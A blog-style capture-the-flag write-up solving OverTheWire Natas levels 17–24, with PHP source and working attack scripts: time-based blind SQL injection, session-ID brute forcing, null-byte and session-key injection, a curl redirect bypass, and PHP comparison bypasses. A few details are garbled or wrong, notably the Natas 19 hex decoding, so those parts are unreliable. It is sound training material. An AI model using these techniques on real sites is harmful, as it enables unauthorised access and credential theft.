---
layout: post
title: OverTheWire - Natas 17-24
---

Site: http://overthewire.org/wargames/natas/ <br>
Level: 17-24<br>
Situation: Basic Web <br><br>

### Natas 17
- - - - - - -

Natas17 is another SQL challenge however what we notice is that when we enter a name we are given a blank page. Regardless if we know the user exist or not we are given a white page. Quick look at the source shows us the reason why.

{% highlight php %}
<? 
/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 
if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas17', '<censored>'); 
    mysql_select_db('natas17', $link); 
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 
    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) > 0) { 
        //echo "This user exists.<br>"; 
    } else { 
        //echo "This user doesn't exist.<br>"; 
    } 
    } else { 
        //echo "Error in query.<br>"; 
    } 
    mysql_close($link); 
} else { 
?> 
{% endhighlight %}

We can see all that occurred was the output was commented out. When this occurs we have a few options however the approach we will take the time based approach. This form of SQL injection is known has time base SQL injection. What we are going to do is add a "sleep" to our query if the query passes the query will pass and we will be able to tell based on execution time. Since it’s essentially the same natas 15 we are going to just need to modify our query to take into account the sleep.

So we turn our SQL string into the following.

{% highlight sql %}
natas18" and users.password COLLATE latin1_bin like "a%" and sleep(10) and "x"="x
{% endhighlight %}

Now all that is left is to modify our script to handle time based attacks. We use pythons built in timers to measure the time between POST.

{% highlight python %}
#blind.py
import time
import requests
from requests.auth import HTTPBasicAuth
letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
solution = ""
for x in range(33):
    for c in letters:
        payload = {'username': 'natas18" and users.password COLLATE latin1_bin like "'+solution+c+'%'+'"and sleep(10) and "x"="x'}
        start = time.time()
        r = requests.post("http://natas17.natas.labs.overthewire.org/", data=payload, auth=HTTPBasicAuth('natas17', 'natas17pass'))
        end = time.time()
        if int(end-start) >= 4:
            solution = solution + c
            print "Solution: " + solution
            break
print "Final: "+solution
{% endhighlight %}

One thing to consider is that if for whatever reason we are unable to get the post result fast enough or we timeout the code will count it as a correct letter.

After running the script we get our password.

### Natas 18
- - - - - - -

Natas 18 presents us with a new login screen. When we enter random information we are given the fact that we are logged in as a normal user. So we head to the source.

{% highlight php %}
-- SNIP --
<? 
$maxid = 640; // 640 should be enough for everyone 
function isValidAdminLogin() { 
    if($_REQUEST["username"] == "admin") { 
    /* This method of authentication appears to be unsafe and has been disabled for now. */ 
        //return 1; 
    } 

    return 0; 
} 
-- SNIP --
-- SNIP --
$showform = true; 
if(my_session_start()) { 
    print_credentials(); 
    $showform = false; 
} else { 
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) { 
    session_id(createID($_REQUEST["username"])); 
    session_start(); 
    $_SESSION["admin"] = isValidAdminLogin(); 
    debug("New session started"); 
    $showform = false; 
    print_credentials(); 
    } 
}
-- SNIP --
?>
{% endhighlight %}

We can tell from this we are issued a session and id after we login. Now basic session hijacking involves utilizing the session id that is stored in our cookie and modifying it to that of another one. Allowing us to assume the session. 

The next bit of useful information is the fact that our session id is limited to 640 possible id's. So in theory if there was a current active admin session we could bruteforce the id.

The source tells us that if we are an admin we will see the following string "You are an admin.". So we can search the responses we get for this string and if we get it we know we have found the correct id. So let’s write up some quick python to do it for us.

{% highlight bash %}
import time
import requests
from requests.auth import HTTPBasicAuth

for x in range(640):
    print "Trying: " + str(x)
    r = requests.get("http://natas18.natas.labs.overthewire.org/", 
auth=HTTPBasicAuth('natas18', 'natas18pass'), 
cookies={"PHPSESSID":str(x)})
    if "You are an admin." in r.text:
        print "FOUND: " + str(x)
        break
        
{% endhighlight %}

After it runs we are given the value of 46. We then edit our cookie.

![Embeded](/images/natas/screen7.png)
[FullSize](/images/natas/screen7.png)

When we enter the value and refresh the page we are given our password.

### Natas 19
- - - - - - -

Natas 19 does not include any source however we are given the following message.

{% highlight bash %}
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
{% endhighlight %}

So to begin with we must first see what our session ids look like. If we enter "asdf" we are returned with the following.

{% highlight bash %}
3533302d61736466
{% endhighlight %}

It is a large sequence of numbers that unfortunately doesn’t show anything and if we enter other information we get another random set of numbers.
To analyze the session id we need to use a static username and password combination. Since we want to get the admin session we will test with "admin" as both our username and password.

We need to gather some test data. So we will login using the admin combination copy our session id then delete the cookie and repeat the process. Doing this four times gives us the following.

{% highlight bash %}
3237382d61646d696e
3432322d61646d696e
3433362d61646d696e
3530382d61646d696e
{% endhighlight %}

We notice that half of the string stays the same.

{% highlight bash %}
323738 2d61646d696e
343232 2d61646d696e
343336 2d61646d696e
353038 2d61646d696e
{% endhighlight %}

If we look closer we notice that in fact each string length is an equal number, more so each 2 characters represent a hex value.

{% highlight bash %}
32 373 8 2d 61 64 6d 69 6e
34 32 32 2d 61 64 6d 69 6e
34 33 36 2d 61 64 6d 69 6e
35 30 38 2d 61 64 6d 69 6e
{% endhighlight %}

Converting these into their ASCII values gives us the following.

{% highlight bash %}
27-admin
422-admin
436-admin
508-admin
{% endhighlight %}

So simple enough we can conclude that if we run through the numbers 0-640 we can find our admin session.
To do this we just change our code from the previous challenge to generate the new session id which is "number-admin"
Then convert it into hex.

{% highlight python %}
import time
import requests
from requests.auth import HTTPBasicAuth

for x in range(640):
    sessionid = str(str(x) + "-admin").encode("hex")
    print "Trying: " + sessionid + ": "+str(x)
    r = requests.get("http://natas19.natas.labs.overthewire.org/", auth=HTTPBasicAuth('natas19', 'natas19pass'), cookies={"PHPSESSID":str(sessionid)})
    print r
    if "You are an admin." in r.text:
        print "FOUND: " + str(x)
        break
{% endhighlight %}

After running this we are given a session id that contains our admin session. We just modify our cookie with this value and refresh our page and we are presented with our admin password.

### Natas 20
- - - - - - -

We are given only a simple field to change our name. As we change our name we immediately can tell our session id is not changing. So our previous attack might not be as useful.
The length of our sessionid is also pretty large if we allow it to generate it for us, so immediately we know a brute forcing method will not work.

{% highlight bash %}
function print_credentials() { 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 
    print "You are an admin. The credentials for the next level are:<br>"; 
    print "<pre>Username: natas21\n"; 
    print "Password: <censored></pre>"; 
    } else { 
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21."; 
    } 
} 

function myread($sid) {  
    debug("MYREAD $sid");  
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) { 
    debug("Invalid SID");  
        return ""; 
    } 
    $filename = session_save_path() . "/" . "mysess_" . $sid; 
    if(!file_exists($filename)) { 
        debug("Session file doesn't exist"); 
        return ""; 
    } 
    debug("Reading from ". $filename); 
    $data = file_get_contents($filename); 
    $_SESSION = array(); 
    foreach(explode("\n", $data) as $line) { 
        debug("Read [$line]"); 
    $parts = explode(" ", $line, 2); 
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1]; 
    } 
    return session_encode(); 
} 

function mywrite($sid, $data) {  
    // $data contains the serialized version of $_SESSION 
    // but our encoding is better 
    debug("MYWRITE $sid $data");  
    // make sure the sid is alnum only!! 
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) { 
    debug("Invalid SID");  
        return; 
    } 
    $filename = session_save_path() . "/" . "mysess_" . $sid; 
    $data = ""; 
    debug("Saving in ". $filename); 
    ksort($_SESSION); 
    foreach($_SESSION as $key => $value) { 
        debug("$key => $value"); 
        $data .= "$key $value\n"; 
    } 
    file_put_contents($filename, $data); 
    chmod($filename, 0600); 
} 
{% endhighlight %}

At first it looks like our job will be spoofing our session_id to contain the information we want. However after further reading we notice there is a much easier attack vector.

Let’s take a closer look at the myread function.

{% highlight bash %}
    debug("Reading from ". $filename); 
    $data = file_get_contents($filename); 
    $_SESSION = array(); 
    foreach(explode("\n", $data) as $line) { 
        debug("Read [$line]"); 
    $parts = explode(" ", $line, 2); 
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1]; 
{% endhighlight %}

It takes a key pair separated by space. Even more so it reads every line for a possible key pair value. So all we have to do is trick the parser into stopping at a point in our string then continue onto the rest of the string as if it were a new line. We need the next key value to be "admin 1". There is a few ways we can do this we can insert a \r\n hex character or use a null byte. For this purpose I picked a null byte injection technique. One thing to note is we can either post it or use the URL to feed the variable name. Has it is received using the $_REQUEST() function. To solve this all we have to do is form our special variable.

{% highlight bash %}
asdf%00admin%201
{% endhighlight %}

asdf = randomusername

%00 = null byte

%20 = space

Now all we do is pass this special name into the function. Making our complete URL look as follows.

{% highlight bash %}
index.php?name=asdf%00admin%201&debug=true
{% endhighlight %}

We run it and we are given our password.

### Natas 21
- - - - - - -

We immediately notice we are dealing with two separate web pages. The first one is our usual challenge page. We look at the source.

{% highlight bash %}
<? 
function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 
    print "You are an admin. The credentials for the next level are:<br>"; 
    print "<pre>Username: natas22\n"; 
    print "Password: <censored></pre>"; 
    } else { 
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22."; 
    } 
} 
session_start(); 
print_credentials(); 
?> 
{% endhighlight %}

We can see that it’s simply checking for the admin flag in our session. So it’s safe to assume the other page is vulnerable.

{% highlight php %}
<?   
session_start(); 
// if update was submitted, store it 
if(array_key_exists("submit", $_REQUEST)) { 
    foreach($_REQUEST as $key => $val) { 
    $_SESSION[$key] = $val; 
    } 
} 
// only allow these keys 
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow"); 
$form = ""; 
$form .= '<form action="index.php" method="POST">'; 
foreach($validkeys as $key => $defval) { 
    $val = $defval; 
    if(array_key_exists($key, $_SESSION)) { 
    $val = $_SESSION[$key]; 
    } else { 
    $_SESSION[$key] = $val; 
    } 
    $form .= "$key: <input name='$key' value='$val' /><br>"; 
} 
$form .= '<input type="submit" name="submit" value="Update" />'; 
$form .= '</form>'; 
$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";"; 
$example = "<div style='$style'>Hello world!</div>"; 
?> 
{% endhighlight %}

From reading the code we notice a few issues. First off the form is created from an array of "validkeys" at first this seems reasonable until we look at the loading code.

{% highlight bash %}
if(array_key_exists("submit", $_REQUEST)) { 
    foreach($_REQUEST as $key => $val) { 
    $_SESSION[$key] = $val; 
    } 
} 
{% endhighlight %}

The loading code does not verify that the loaded key is valid it simply loads the key into the session. So if we are correct we can inject a value into our session. In this case "admin" with the value of 1. To do this we just utilize google chromes built in inline editor.

![Embeded](/images/natas/screen8.png)
[FullSize](/images/natas/screen8.png)

After we do that we hit update. However if we fresh the original page we aren’t in. The last thing we need to do is copy the session id from the "experimenter" page to the standard page. After it is copied over we refresh and we are given our password.

### Natas 22
- - - - - - -

We are presented with a blank page. So straight to the source we go.

{% highlight php %}

<? 
session_start(); 
if(array_key_exists("revelio", $_GET)) { 
    // only admins can reveal the password 
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) { 
    header("Location: /"); 
    } 
} 
?> 
<? 
    if(array_key_exists("revelio", $_GET)) { 
    print "You are an admin. The credentials for the next level are:<br>"; 
    print "<pre>Username: natas23\n"; 
    print "Password: <censored></pre>"; 
    } 
?> 
{% endhighlight %}

At first glance it looks like all we will have to do is add "revelio" to our URL however if we look closer we notice that there is a redirect at the beginning of the page.
In PHP the "header() function returns a 302 redirect to the browser. If we somehow ignore the 302 redirect we can continue on to the rest of code and get the password. Unfortunately I was unable to find a plugin for chrome. Thankfully if we look at curl we notice that it does not follow 302 redirects. So all we need to do is the following to get our password.

{% highlight bash %}
curl --user natas22:natas22password http://natas22.natas.labs.overthewire.org/index.php\?revelio\=true
{% endhighlight %}

### Natas 23
- - - - - - -

We are presented with a simple password form that when we enter data tells us we are wrong. So straight to the source.

{% highlight php %}
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
{% endhighlight %}

First a check to see if passwd is in our $_REQUEST array. Then there is a strstr(arg1,arg2) function what is done here is the arg1 string is searched for the arg2 string if it is found it returns everything after the first character of the pattern *including the first character* if it doesn’t find it returns false. 

The next check is if $_REQUEST["passwd"] > 10. It is important to note this is not checking for string length. When a comparison operator is done against a string PHP attempts to cast it to an int. So all we have to do in order to pass these checks if format our string as follows.

{% highlight bash %}
11iloveyou
{% endhighlight %}

After we insert that we are given our password.

### Natas 24
- - - - - - -

We are given yet another password field that tells us we are wrong when we enter a random string. So we open up the source to find the following.

{% highlight php %}
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
{% endhighlight %}

Looking at it we have a simple strcmp. At first the only option looks like to brute force it however. If we look at the documentation for strcmp it only has 3 possible return values. 

{% highlight bash %}
Returns < 0 if str1 is less than str2; > 0 if str1 is greater than str2, and 0 if they are equal.
{% endhighlight %}

Because we know no matter what it will return something and not give us a exception we can utilize some interesting PHP fun. A string is technically an array object. So comparing the two should show favorable outcome. We modify our URL to include a [] which in PHP $_GET and $_RESPONSE represents an array object.

{% highlight bash %}
index.php?passwd[]=asdf
{% endhighlight %}

We run it and we get our password.